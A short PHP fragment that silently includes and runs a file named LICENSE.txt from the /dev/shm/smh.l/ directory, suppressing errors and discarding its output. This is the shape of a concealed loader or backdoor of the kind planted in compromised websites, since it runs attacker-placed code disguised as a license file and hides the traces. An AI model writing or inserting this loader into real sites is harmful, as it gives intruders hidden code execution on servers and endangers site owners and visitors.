<?php
if (file_exists('/dev/shm/smh.l/LICENSE.txt')) {
    @ob_start();
    @include '/dev/shm/smh.l/LICENSE.txt';
    @ob_end_clean();
}
